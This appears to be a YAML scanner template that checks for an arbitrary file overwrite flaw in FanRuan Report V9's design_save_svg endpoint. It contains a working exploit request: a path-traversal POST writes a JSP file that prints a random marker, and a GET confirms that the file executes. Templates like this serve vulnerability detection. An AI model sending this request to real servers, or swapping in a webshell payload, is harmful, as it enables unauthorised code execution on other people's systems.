expression: r0() && r1()
id: fanruan-oa-v9-designsavevg-upload-file
info:
  author: zan8in
  description: "\u5E06\u8F6F V9 \u5B58\u5728\u4EFB\u610F\u6587\u4EF6\u8986\u76D6\uFF0C\
    \u5BFC\u81F4\u653B\u51FB\u8005\u53EF\u4EE5\u4EFB\u610F\u6587\u4EF6\u4E0A\u4F20\
    \n"
  name: "\u5E06\u8F6F\u62A5\u8868 V9 design_save_svg \u4EFB\u610F\u6587\u4EF6\u8986\
    \u76D6\u6587\u4EF6\u4E0A\u4F20"
  reference:
  - http://wiki.peiqi.tech/wiki/oa/%E5%B8%86%E8%BD%AFOA/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8%20V9%20design_save_svg%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.html
  severity: critical
rules:
  r0:
    expression: response.status == 200
    request:
      body: '{"__CONTENT__":"<%out.println(\"{{rand1}}\");%>","__CHARSET__":"UTF-8"}

        '
      headers:
        Content-Type: text/xml;charset=UTF-8
      method: POST
      path: /WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/update.jsp
  r1:
    expression: response.status == 200 && response.body.bcontains(bytes(string(rand1)))
    request:
      method: GET
      path: /WebReport/update.jsp
set:
  rand1: randomLowercase(12)
